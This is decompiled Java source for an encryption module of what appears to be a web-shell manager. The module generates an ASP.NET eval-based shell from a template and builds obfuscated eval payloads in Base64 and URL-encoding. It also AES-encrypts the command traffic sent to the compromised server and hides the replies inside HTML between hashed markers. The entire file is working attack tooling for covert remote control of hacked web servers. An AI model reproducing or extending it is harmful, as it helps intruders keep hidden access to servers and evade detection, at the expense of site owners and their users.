//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
        Name = "CSHARP_EVAL_AES_BASE64",
        payloadName = "CSharpDynamicPayload"
)
public class CSharpEvalAesBase64 implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;
    private String evalContent;

    public CSharpEvalAesBase64() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.shell.getSecretKey() + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16).toUpperCase();
        this.findStrRight = findStrMd5.substring(16).toUpperCase();
        this.evalContent = this.generateEvalContent();

        try {
            this.encodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.decodeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"), new IvParameterSpec(this.key.getBytes()));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return (String.format("%s=%s&", this.pass, this.evalContent) + this.shell.getSecretKey() + "=" + URLEncoder.encode(functions.base64EncodeToString(this.encodeCipher.doFinal(data)))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    public String generateEvalContent() {
        String eval = (new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/eval.bin")))).replace("{secretKey}", this.key).replace("{pass}", this.shell.getSecretKey());
        eval = functions.base64EncodeToString(eval.getBytes());
        eval = String.format("eval(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(HttpUtility.UrlDecode('%s'))),'unsafe');", URLEncoder.encode(eval));
        eval = URLEncoder.encode(eval);
        return eval;
    }

    public boolean isSendRLData() {
        return true;
    }

    public boolean check() {
        return this.state;
    }

    @Override
    public boolean status() {
        return false;
    }

    public byte[] generate(String password, String secretKey) {
        return (new String(functions.readInputStreamAutoClose(CSharpEvalAesBase64.class.getResourceAsStream("template/evalShell.bin")))).replace("{pass}", password).getBytes();
    }
}
